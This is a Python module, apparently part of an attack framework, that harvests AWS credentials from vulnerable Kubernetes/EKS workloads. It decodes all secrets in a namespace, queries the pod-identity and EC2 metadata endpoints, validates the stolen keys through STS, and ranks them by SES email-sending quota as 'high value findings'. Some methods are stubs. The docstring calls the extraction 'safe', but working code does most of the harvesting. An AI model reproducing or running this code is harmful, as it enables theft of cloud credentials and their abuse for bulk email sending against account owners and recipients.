"""
Credential Extraction Module
Safely extracts and validates AWS credentials from vulnerable configurations
"""

import asyncio
import aiohttp
import re
import json
import os
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
import yaml
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
from kubernetes import client
import base64


class CredentialExtractor:
    """Extracts and validates AWS credentials from various sources"""
    
    def __init__(self, framework_config):
        self.config = framework_config
        self.logger = framework_config.logger
        
        # Regex patterns for credential detection
        self.credential_patterns = {
            'aws_access_key': re.compile(r'AKIA[0-9A-Z]{16}'),
            'aws_secret_key': re.compile(r'[A-Za-z0-9/+=]{40}'),
            'aws_session_token': re.compile(r'[A-Za-z0-9/+=]{100,}'),
            'aws_role_arn': re.compile(r'arn:aws:iam::\d{12}:role/[a-zA-Z0-9+=,.@_-]+')
        }
        
        # File patterns to search
        self.search_patterns = self.config.credential_extraction['file_patterns']
        
        # Initialize results storage
        self.extracted_credentials = []
        self.validated_credentials = []
    
    async def extract_from_findings(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Extract credentials based on vulnerability findings
        """
        results = {
            'extraction_methods': [],
            'credentials_found': 0,
            'validated_credentials': 0,
            'extraction_details': []
        }
        
        # Process each vulnerability for credential extraction opportunities
        for vuln in vulnerabilities:
            extraction_methods = self._get_extraction_methods_for_vulnerability(vuln)
            
            for method in extraction_methods:
                try:
                    extracted = await self._execute_extraction_method(method, vuln)
                    if extracted:
                        results['extraction_details'].extend(extracted)
                        results['credentials_found'] += len(extracted)
                        
                        # Validate extracted credentials
                        for cred in extracted:
                            if await self._validate_credential(cred):
                                self.validated_credentials.append(cred)
                                results['validated_credentials'] += 1
                
                except Exception as e:
                    self.logger.warning(f"Credential extraction failed for {method}: {e}")
        
        # Generate summary
        results['summary'] = self._generate_extraction_summary()
        
        return results
    
    def _get_extraction_methods_for_vulnerability(self, vuln: Dict[str, Any]) -> List[str]:
        """
        Determine appropriate extraction methods based on vulnerability type
        """
        methods = []
        vuln_type = vuln.get('type', '')
        
        method_mapping = {
            'privileged_container_with_pod_identity': [
                'kubernetes_secrets',
                'environment_variables',
                'mounted_files',
                'metadata_service'
            ],
            'host_network_pod_identity_access': [
                'metadata_service_interception',
                'network_traffic_analysis'
            ],
            'overprivileged_pod_identity_role': [
                'role_enumeration',
                'sts_token_extraction'
            ],
            'dangerous_capabilities_with_pod_identity': [
                'capability_abuse',
                'process_memory_dump'
            ]
        }
        
        return method_mapping.get(vuln_type, ['general_search'])
    
    async def _execute_extraction_method(self, method: str, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Execute specific credential extraction method
        """
        method_handlers = {
            'kubernetes_secrets': self._extract_from_kubernetes_secrets,
            'environment_variables': self._extract_from_environment,
            'mounted_files': self._extract_from_mounted_files,
            'metadata_service': self._extract_from_metadata_service,
            'metadata_service_interception': self._intercept_metadata_service,
            'role_enumeration': self._enumerate_iam_roles,
            'general_search': self._general_credential_search
        }
        
        handler = method_handlers.get(method)
        if handler:
            return await handler(vuln)
        
        return []
    
    async def _extract_from_kubernetes_secrets(self, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Extract credentials from Kubernetes secrets
        """
        credentials = []
        
        try:
            # This would require authenticated access to the cluster
            # Implementation depends on available access level
            
            pod_details = vuln.get('details', {})
            namespace = pod_details.get('namespace', 'default')
            
            # Search for secrets in the namespace
            v1 = client.CoreV1Api()
            secrets = v1.list_namespaced_secret(namespace=namespace)
            
            for secret in secrets.items:
                secret_data = secret.data or {}
                
                for key, value in secret_data.items():
                    try:
                        decoded_value = base64.b64decode(value).decode('utf-8')
                        
                        # Check if this looks like AWS credentials
                        aws_creds = self._parse_aws_credentials(decoded_value)
                        if aws_creds:
                            credentials.append({
                                'source': 'kubernetes_secret',
                                'location': f"{namespace}/{secret.metadata.name}/{key}",
                                'credentials': aws_creds,
                                'extraction_method': 'kubernetes_secrets'
                            })
                    
                    except Exception as e:
                        self.logger.debug(f"Failed to decode secret {key}: {e}")
        
        except Exception as e:
            self.logger.debug(f"Kubernetes secret extraction failed: {e}")
        
        return credentials
    
    async def _extract_from_environment(self, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Extract credentials from environment variables
        """
        credentials = []
        
        # Common AWS environment variable names
        aws_env_vars = [
            'AWS_ACCESS_KEY_ID',
            'AWS_SECRET_ACCESS_KEY',
            'AWS_SESSION_TOKEN',
            'AWS_SECURITY_TOKEN',
            'AWS_ROLE_ARN',
            'AWS_DEFAULT_REGION'
        ]
        
        try:
            # This would require container access - implementation depends on exploit method
            # For demonstration, showing the pattern
            
            pod_details = vuln.get('details', {})
            
            # Simulate environment variable extraction from container
            env_vars = await self._get_container_environment(pod_details)
            
            aws_creds = {}
            for var_name, var_value in env_vars.items():
                if var_name in aws_env_vars:
                    aws_creds[var_name] = var_value
            
            if aws_creds:
                credentials.append({
                    'source': 'environment_variables',
                    'location': f"Pod: {pod_details.get('pod_name', 'unknown')}",
                    'credentials': aws_creds,
                    'extraction_method': 'environment_variables'
                })
        
        except Exception as e:
            self.logger.debug(f"Environment variable extraction failed: {e}")
        
        return credentials
    
    async def _extract_from_metadata_service(self, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Extract credentials from EKS metadata service
        """
        credentials = []
        
        try:
            # EKS Pod Identity metadata endpoint
            metadata_endpoints = [
                "http://169.254.170.23/v1/credentials",  # EKS Pod Identity
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # EC2 IMDS
            ]
            
            for endpoint in metadata_endpoints:
                try:
                    async with aiohttp.ClientSession(
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as session:
                        
                        async with session.get(endpoint) as response:
                            if response.status == 200:
                                cred_data = await response.json()
                                
                                # Parse credential response
                                parsed_creds = self._parse_metadata_credentials(cred_data)
                                if parsed_creds:
                                    credentials.append({
                                        'source': 'metadata_service',
                                        'location': endpoint,
                                        'credentials': parsed_creds,
                                        'extraction_method': 'metadata_service'
                                    })
                
                except Exception as e:
                    self.logger.debug(f"Metadata service access failed for {endpoint}: {e}")
        
        except Exception as e:
            self.logger.debug(f"Metadata service extraction failed: {e}")
        
        return credentials
    
    async def _intercept_metadata_service(self, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Intercept metadata service traffic (for host network vulnerabilities)
        """
        credentials = []
        
        # This would implement traffic interception techniques
        # for pods with host network access
        
        try:
            # Implementation would involve:
            # 1. Setting up packet capture on metadata IP
            # 2. Analyzing HTTP requests to metadata service
            # 3. Extracting credentials from intercepted traffic
            
            self.logger.info("Metadata service interception not implemented in demo")
            
        except Exception as e:
            self.logger.debug(f"Metadata service interception failed: {e}")
        
        return credentials
    
    async def _get_container_environment(self, pod_details: Dict[str, Any]) -> Dict[str, str]:
        """
        Get environment variables from container (requires container access)
        """
        # This would require actual container access through kubectl exec
        # or container runtime API
        
        # For demonstration, return empty dict
        return {}
    
    def _parse_aws_credentials(self, text: str) -> Optional[Dict[str, str]]:
        """
        Parse AWS credentials from text using regex patterns
        """
        credentials = {}
        
        # Look for AWS access key
        access_key_match = self.credential_patterns['aws_access_key'].search(text)
        if access_key_match:
            credentials['access_key'] = access_key_match.group()
        
        # Look for secret key
        secret_key_match = self.credential_patterns['aws_secret_key'].search(text)
        if secret_key_match:
            credentials['secret_key'] = secret_key_match.group()
        
        # Look for session token
        session_token_match = self.credential_patterns['aws_session_token'].search(text)
        if session_token_match:
            credentials['session_token'] = session_token_match.group()
        
        # Look for role ARN
        role_arn_match = self.credential_patterns['aws_role_arn'].search(text)
        if role_arn_match:
            credentials['role_arn'] = role_arn_match.group()
        
        return credentials if credentials else None
    
    def _parse_metadata_credentials(self, data: Dict[str, Any]) -> Optional[Dict[str, str]]:
        """
        Parse credentials from metadata service response
        """
        try:
            # EKS Pod Identity format
            if 'AccessKeyId' in data:
                return {
                    'access_key': data['AccessKeyId'],
                    'secret_key': data['SecretAccessKey'],
                    'session_token': data.get('Token', ''),
                    'expiration': data.get('Expiration', '')
                }
            
            # EC2 IMDS format
            if 'Credentials' in data:
                creds = data['Credentials']
                return {
                    'access_key': creds['AccessKeyId'],
                    'secret_key': creds['SecretAccessKey'],
                    'session_token': creds.get('SessionToken', ''),
                    'expiration': creds.get('Expiration', '')
                }
        
        except Exception as e:
            self.logger.debug(f"Failed to parse metadata credentials: {e}")
        
        return None
    
    async def _validate_credential(self, credential_data: Dict[str, Any]) -> bool:
        """
        Validate extracted AWS credentials
        """
        try:
            creds = credential_data.get('credentials', {})
            
            # Create boto3 session with extracted credentials
            session = boto3.Session(
                aws_access_key_id=creds.get('access_key'),
                aws_secret_access_key=creds.get('secret_key'),
                aws_session_token=creds.get('session_token')
            )
            
            # Test credentials with STS
            sts_client = session.client('sts')
            identity = sts_client.get_caller_identity()
            
            # Add validation results to credential data
            credential_data['validation'] = {
                'valid': True,
                'account_id': identity.get('Account'),
                'user_id': identity.get('UserId'),
                'arn': identity.get('Arn')
            }
            
            # Check SES permissions if requested
            if self.config.aws['ses']['check_sending_quota']:
                ses_info = await self._check_ses_permissions(session)
                credential_data['ses_info'] = ses_info
            
            self.logger.info(f"Validated credentials for account {identity.get('Account')}")
            return True
        
        except (ClientError, NoCredentialsError) as e:
            credential_data['validation'] = {
                'valid': False,
                'error': str(e)
            }
            self.logger.debug(f"Credential validation failed: {e}")
            return False
    
    async def _check_ses_permissions(self, session) -> Dict[str, Any]:
        """
        Check SES permissions and quotas for validated credentials
        """
        ses_info = {
            'has_ses_access': False,
            'sending_quota': 0,
            'sent_last_24h': 0,
            'send_rate': 0
        }
        
        try:
            ses_client = session.client('ses')
            
            # Get sending quota
            quota_response = ses_client.get_send_quota()
            ses_info.update({
                'has_ses_access': True,
                'sending_quota': quota_response.get('Max24HourSend', 0),
                'sent_last_24h': quota_response.get('SentLast24Hours', 0),
                'send_rate': quota_response.get('MaxSendRate', 0)
            })
            
            # Get reputation info
            reputation = ses_client.get_reputation()
            ses_info['reputation'] = reputation
            
        except ClientError as e:
            if 'AccessDenied' not in str(e):
                self.logger.debug(f"SES permission check failed: {e}")
        
        return ses_info
    
    async def _enumerate_iam_roles(self, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Enumerate IAM roles (requires appropriate permissions)"""
        return []
    
    async def _general_credential_search(self, vuln: Dict[str, Any]) -> List[Dict[str, Any]]:
        """General credential search in accessible locations"""
        return []
    
    def _generate_extraction_summary(self) -> Dict[str, Any]:
        """Generate summary of credential extraction results"""
        
        return {
            'total_extracted': len(self.extracted_credentials),
            'total_validated': len(self.validated_credentials),
            'success_rate': len(self.validated_credentials) / max(len(self.extracted_credentials), 1),
            'extraction_sources': list(set(
                cred.get('source', 'unknown') 
                for cred in self.extracted_credentials
            )),
            'high_value_findings': [
                cred for cred in self.validated_credentials
                if cred.get('ses_info', {}).get('sending_quota', 0) > 1000
            ]
        }